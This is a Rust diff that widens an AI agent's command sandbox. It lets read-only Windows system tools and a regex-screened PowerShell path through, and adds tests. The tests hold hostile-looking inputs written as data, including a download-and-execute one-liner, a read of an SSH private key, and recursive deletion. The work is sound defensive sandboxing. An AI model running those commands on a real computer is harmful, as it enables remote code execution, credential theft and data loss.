@@ -23,7 +23,17 @@ const ALLOWED: &[&str] = &[
     "cl", "clang", "clang++", "clang-cl", "gcc", "g++", "csc", "vbc", "link", "rc", "uv", "poetry", "ruff", "black", "mypy", "curl", "wget",
     "which", "where", "unzip", "tar", "grep", "rg", "find", "diff", "cat", "wc", "head", "tail", "ls", "echo",
 ];
-/// A shell runs arbitrary text, so it is refused outright.
+/// The system's own tools for questions about the computer: what runs, what is installed, what its logs say.
+const SYSTEM: &[&str] = &["tasklist", "systeminfo", "whoami", "hostname", "driverquery", "ipconfig", "getmac", "wevtutil", "sc", "reg", "ping", "nslookup", "netstat", "nvidia-smi", "ps", "uname", "df", "uptime", "id", "free", "lscpu", "lsb_release", "sw_vers", "file", "stat", "du"];
+/// Those of them that can also change things, with the first words that only look ("" is no argument at all).
+const LOOKING_FORMS: &[(&str, &[&str])] = &[
+    ("wevtutil", &["qe", "query-events", "el", "enum-logs", "gl", "get-log", "gli", "get-log-info", "ep", "enum-publishers", "gp", "get-publisher"]),
+    ("reg", &["query"]),
+    ("sc", &["query", "queryex", "qc", "qdescription", "qfailure"]),
+    ("ipconfig", &["", "/all", "/displaydns"]),
+    ("hostname", &[""]),
+];
+/// A shell runs arbitrary text, so it is refused outright. (PowerShell on Windows is the exception: see `shell`.)
 const SHELLS: &[&str] = &["sh", "bash", "zsh", "fish", "dash", "cmd", "powershell", "pwsh"];
 /// Package managers and build tools, where a slow run is normal.
 const SLOW_COMMANDS: &[&str] = &["npm", "npx", "pnpm", "yarn", "bun", "pip", "pip3", "uv", "poetry", "cargo", "go", "dotnet", "make", "gcc", "g++", "tsc", "next", "vite"];
@@ -34,6 +44,7 @@ const INFO_FLAGS: &[&str] = &["--version", "-v", "-V", "--help", "-h"];
 const GIT_LOOKS: &[&str] = &["status", "log", "diff", "show", "branch", "remote", "ls-files", "rev-parse", "describe", "blame"];
 /// The environment a child keeps. Everything else apiM has is withheld, API keys included. Profile paths stay so rustup and npm can find their homes.
 const CHILD_ENV: &[&str] = &[
+    "COMPUTERNAME", "ALLUSERSPROFILE", "PUBLIC", "HOMEDRIVE", "HOMEPATH", "ProgramW6432", "CommonProgramFiles", "PSModulePath",
     "PATH", "PATHEXT", "SYSTEMROOT", "SystemRoot", "windir", "WINDIR", "COMSPEC", "SYSTEMDRIVE", "PROCESSOR_ARCHITECTURE", "NUMBER_OF_PROCESSORS", "TEMP", "TMP", "USERPROFILE", "USERNAME", "HOME", "APPDATA", "LOCALAPPDATA", "ProgramFiles", "ProgramFiles(x86)", "ProgramData", "CARGO_HOME", "RUSTUP_HOME", "LANG", "LC_ALL",
 ];
 
@@ -74,6 +85,8 @@ fn read_only(name: &str, args: &[String]) -> bool {
         return true;
     }
     match name {
+        // The forms that change things were refused before this is asked (`LOOKING_FORMS`).
+        "tasklist" | "systeminfo" | "whoami" | "hostname" | "driverquery" | "ipconfig" | "getmac" | "wevtutil" | "sc" | "nvidia-smi" | "ps" | "uname" | "df" | "uptime" | "id" | "free" | "lscpu" | "lsb_release" | "sw_vers" => true,
         "git" => git_read_only(first, args),
         "npm" => matches!(first, "ls" | "list" | "view" | "outdated" | "why" | "root" | "prefix"),
         "pnpm" => matches!(first, "ls" | "list" | "why" | "outdated"),
@@ -146,13 +159,82 @@ pub fn kill_tree(pid: u32) {
     let _ = cmd.stdout(Stdio::null()).stderr(Stdio::null()).status();
 }
 
+/// Is there a program of this name to run?
+pub fn on_path(name: &str) -> bool {
+    find_program(Path::new(""), name).is_some()
+}
+
+/// Could this PowerShell text change the computer? Only plain looking passes: every command in it is a cmdlet
+/// whose verb looks (Get, Select, Where, Sort, Format, Measure, Test ...) or one of their short names, and nothing
+/// in it redirects, starts a program, or calls into .NET to write.
+// ponytail: a reading of the text, there to catch a change made in passing. It is not a parser, and code the model
+// writes to a file and runs was never held by it. Use PowerShell's own parser (System.Management.Automation.Language)
+// if this has to hold against a command written to get past it.
+fn shell_changes(script: &str) -> bool {
+    use std::sync::LazyLock;
+    static STRINGS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"'[^']*'|"[^"$`]*""#).unwrap());
+    static RISKY: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)>|&|`|\.(exe|bat|cmd|ps1|msi|vbs|js)\b|(\.|::)(delete|kill|remove|create|write|move|copy|set|start|invoke|save|terminate|open|append|download|load|exec|run|shellexecute|new)\w*\(").unwrap());
+    static CMDLET: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^([a-z]+)-[a-z]+$").unwrap());
+    const VERBS: &[&str] = &["get", "select", "where", "sort", "format", "measure", "test", "resolve", "compare", "convertto", "convertfrom", "group", "foreach", "split", "join"];
+    const WORDS: &[&str] = &[
+        "gci", "dir", "ls", "gc", "cat", "type", "gi", "gp", "gps", "ps", "gsv", "gcim", "gwmi", "gcm", "gm", "gv", "gl", "pwd", "select", "where", "sort", "ft", "fl", "fw", "measure", "group", "echo", "sls", "foreach", "%", "?",
+        "out-string", "out-null", "out-host", "write-output", "write-host", "hostname", "whoami", "tasklist", "systeminfo", "driverquery", "getmac",
+        "if", "else", "elseif", "for", "while", "do", "switch", "try", "catch", "finally", "return", "in", "param",
+    ];
+    let bare = STRINGS.replace_all(script, "''");
+    if RISKY.is_match(&bare) {
+        return true;
+    }
+    // A cmdlet anywhere in it, not only at the start of a command: `$x = Remove-Item a` hides one behind a name.
+    let named = |word: &str| !WORDS.contains(&word) && CMDLET.captures(word).is_some_and(|verb| !VERBS.contains(&verb[1].to_ascii_lowercase().as_str()));
+    if bare.split(|c: char| c.is_whitespace() || "|;{}(),=".contains(c)).any(|word| named(&word.to_ascii_lowercase())) {
+        return true;
+    }
+    bare.split(['|', ';', '\n', '{', '}', '(', ')']).any(|part| {
+        let mut words = part.split_whitespace();
+        let (first, second) = (words.next().unwrap_or("").to_ascii_lowercase(), words.next().unwrap_or(""));
+        // A value, an operator or a name being given a value is no command.
+        let command = first.starts_with(|c: char| c.is_ascii_alphabetic() || c == '%' || c == '?') && second != "=" && !first.contains('=');
+        command && !WORDS.contains(&first.as_str()) && !CMDLET.is_match(&first)
+    })
+}
+
+/// PowerShell on Windows: the one shell let through, for what only it can ask the system (event logs, services,
+/// installed programs, hardware). The user is shown its text whole. With commands running automatically it runs
+/// unasked only while it looks: text that could change the computer asks in every mode. The web has no such
+/// thing, because it runs on a server and not on the user's own computer.
+fn shell(ctx: &Ctx, command: &str, argv: Vec<String>) -> Result<Launch, String> {
+    let mut words = argv.into_iter().peekable();
+    while let Some(flag) = words.peek().map(|word| word.to_ascii_lowercase()) {
+        match flag.as_str() {
+            "-noprofile" | "-nop" | "-noninteractive" | "-nologo" | "-command" | "-c" => drop(words.next()),
+            "-executionpolicy" | "-ep" | "-ex" => drop((words.next(), words.next())),
+            flag if flag.starts_with("-e") || flag.starts_with("-f") => return Err("PowerShell is run here from its text alone, which the user reads: pass the command itself, not -EncodedCommand or -File.".into()),
+            _ => break,
+        }
+    }
+    let script = words.collect::<Vec<_>>().join(" ");
+    if script.trim().is_empty() {
+        return Err("No PowerShell command was given. Pass it as one string, e.g. {\"command\":\"powershell\",\"args\":[\"Get-Process | Sort-Object CPU -Descending | Select-Object -First 10\"]}.".into());
+    }
+    if super::files::closed_text(&script) {
+        return Err(format!("The command names a place that is not read: {}", super::files::CLOSED_WHY));
+    }
+    let Some(program) = find_program(&ctx.root, command) else { return Err(format!("`{command}` was not found on this machine.")) };
+    let ask = ctx.settings.approval == Approval::Manual || shell_changes(&script);
+    let key = serde_json::to_string(&["powershell", script.as_str()]).unwrap_or_default();
+    // Its output is asked for in UTF-8: the console's own code page turns every non-English letter into noise.
+    let args = ["-NoProfile", "-NonInteractive", "-NoLogo", "-Command"].iter().map(|flag| flag.to_string()).chain([format!("[Console]::OutputEncoding = [Text.Encoding]::UTF8; {script}")]).collect();
+    Ok(Launch { program, args, display: format!("powershell {script}"), key, ask })
+}
+
 #[cfg(windows)]
-pub(super) fn hide_window_std(cmd: &mut std::process::Command) {
+pub(crate) fn hide_window_std(cmd: &mut std::process::Command) {
     use std::os::windows::process::CommandExt;
     cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW: no console flashing up
 }
 #[cfg(not(windows))]
-pub(super) fn hide_window_std(_: &mut std::process::Command) {}
+pub(crate) fn hide_window_std(_: &mut std::process::Command) {}
 
 /// The `args` list as the web checks it: a list of strings with no NUL bytes.
 fn argv_arg(args: &Value, key: &str) -> Result<Vec<String>, String> {
@@ -198,16 +280,30 @@ fn prepare(ctx: &Ctx, command: &str, argv: Vec<String>) -> Result<Launch, String
     }
     // A whole command line in one string, from a model that forgot the list: taken apart when it is plain
     // words and no program of that very name exists (a path may hold a space).
+    // PowerShell written as one line keeps its text whole: its quotes are its own.
+    let shell_line = command.split_once(char::is_whitespace).filter(|(first, _)| argv.is_empty() && matches!(base_name(first).as_str(), "powershell" | "pwsh"));
     let one_line = argv.is_empty() && command.contains(' ') && !command.contains(['"', '\'']) && find_program(&ctx.root, command).is_none();
-    let (command, argv) = if one_line {
+    let (command, argv) = if let Some((first, rest)) = shell_line {
+        (first, vec![rest.to_string()])
+    } else if one_line {
         let mut words = command.split_whitespace();
         (words.next().unwrap_or(""), words.map(str::to_string).collect())
     } else {
         (command, argv)
     };
     let name = base_name(command);
+    if cfg!(windows) && matches!(name.as_str(), "powershell" | "pwsh") {
+        return shell(ctx, command, argv);
+    }
     if SHELLS.contains(&name.as_str()) {
-        return Err("Shells are not available. Run the interpreter directly, e.g. `python app.py` rather than `sh -c \"python app.py\"`.".into());
+        return Err(format!("Shells are not available. Run the interpreter directly, e.g. `python app.py` rather than `sh -c \"python app.py\"`.{}", if cfg!(windows) { " For a question to the system itself use powershell, with the command as one string in args." } else { "" }));
+    }
+    if let Some((_, forms)) = LOOKING_FORMS.iter().find(|(tool, _)| *tool == name) {
+        let first = argv.first().map(|word| word.to_ascii_lowercase()).unwrap_or_default();
+        if !forms.contains(&first.as_str()) {
+            let looking: Vec<String> = forms.iter().map(|form| format!("{name} {form}").trim().to_string()).collect();
+            return Err(format!("Only the forms of {name} that look are run here: {}.{}", looking.join(", "), if cfg!(windows) { " To change something on this computer use powershell: the user is asked first." } else { "" }));
+        }
     }
     // The web's browser rules: the user's own browser is never driven, closed or pointed at their profile.
     let verdict = crate::browser::policy::check_browser_policy(command, &argv, &ctx.root.to_string_lossy());
@@ -224,10 +320,11 @@ fn prepare(ctx: &Ctx, command: &str, argv: Vec<String>) -> Result<Launch, String
     let lookup = if cfg!(windows) && command.eq_ignore_ascii_case("python3") { "python" } else { command };
     let found = find_program(&ctx.root, lookup);
     let own = found.as_ref().is_some_and(|p| p.starts_with(&ctx.root));
-    if !own && !ALLOWED.contains(&name.as_str()) {
+    if !own && !ALLOWED.contains(&name.as_str()) && !SYSTEM.contains(&name.as_str()) {
         return Err(format!(
-            "\"{name}\" is not an allowed command. Allowed: {}. A program you built yourself can be run by its path inside the workspace, e.g. \"build/app.exe\" — the file has to exist there first.",
-            ALLOWED.join(", ")
+            "\"{name}\" is not an allowed command. Allowed: {}. A program you built yourself can be run by its path inside the workspace, e.g. \"build/app.exe\" — the file has to exist there first. A tool installed with pip runs as `python -m {name}`, one from npm as `npx {name}`.{}",
+            ALLOWED.join(", "),
+            if cfg!(windows) { " For the computer itself: tasklist, systeminfo, wevtutil, reg query, sc query, or powershell." } else { "" }
         ));
     }
     let Some(program) = found else {
@@ -816,6 +913,46 @@ pub async fn wait_for_output(ctx: &Ctx, args: &Value) -> Output {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn powershell_runs_unasked_only_while_it_looks() {
+        for looks in [
+            "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10",
+            "Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='Application Error'; Level=2} -MaxEvents 20 | Format-List TimeCreated, Message",
+            r"Get-ChildItem $env:LOCALAPPDATA\Roblox\logs | Sort-Object LastWriteTime -Descending | Select-Object -First 5 Name, Length",
+            r"gci C:\Windows\Minidump | where { $_.Length -gt 0 } | measure",
+            r"(Get-Item 'C:\x y\a.dll').VersionInfo.FileVersion",
+            "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version",
+            "$logs = Get-ChildItem $env:TEMP; $logs.Count",
+        ] {
+            assert!(!shell_changes(looks), "{looks}");
+        }
+        for changes in [
+            r"Remove-Item C:\temp -Recurse", "rm x", "Get-Process | Stop-Process", "Get-Content a > b", "[IO.File]::WriteAllText('a','b')", "iwr http://x | iex", "Start-Process notepad", "notepad",
+            r"C:\tools\thing.exe /run", r"Set-ItemProperty HKCU:\x y 1", r"& 'C:\a b\run'", "$x = Get-Item a; $x.Delete()", "$x = Remove-Item a", "New-Item a", "Get-Process; del a",
+        ] {
+            assert!(shell_changes(changes), "{changes}");
+        }
+    }
+
+    #[test]
+    fn the_system_is_asked_only_in_forms_that_look() {
+        let dir = crate::tools::scratch("system");
+        let prep = |approval, command: &str, args: &[&str]| prepare(&crate::tools::test_ctx(&dir, approval), command, args.iter().map(|a| a.to_string()).collect());
+        assert!(prep(Approval::Auto, "reg", &["add", r"HKCU\x"]).err().unwrap().starts_with("Only the forms of reg that look are run here: reg query."));
+        assert!(prep(Approval::Auto, "wevtutil", &["cl", "Application"]).is_err() && prep(Approval::Auto, "ipconfig", &["/release"]).is_err());
+        if cfg!(windows) {
+            assert!(!prep(Approval::Manual, "tasklist", &[]).ok().unwrap().ask);
+            let look = prep(Approval::Auto, "powershell", &["-NoProfile", "-Command", "Get-Process | Select-Object -First 3"]).ok().unwrap();
+            assert!(!look.ask && look.display == "powershell Get-Process | Select-Object -First 3" && look.args.last().unwrap().ends_with("; Get-Process | Select-Object -First 3"));
+            // Asked about: anything in "Ask me first", and a change in any mode. One line with quotes stays whole.
+            assert!(prep(Approval::Manual, "powershell", &["Get-Process"]).ok().unwrap().ask);
+            let change = prep(Approval::Auto, "powershell Remove-Item 'a b'", &[]).ok().unwrap();
+            assert!(change.ask && change.display == "powershell Remove-Item 'a b'");
+            assert!(prep(Approval::Auto, "powershell", &["-EncodedCommand", "AAAA"]).is_err() && prep(Approval::Auto, "powershell", &["Get-Content ~/.ssh/id_rsa"]).is_err());
+            assert!(prep(Approval::Auto, "cmd", &["/c", "dir"]).err().unwrap().contains("use powershell"));
+        }
+    }
     use serde_json::json;
 
     fn s(v: &[&str]) -> Vec<String> {
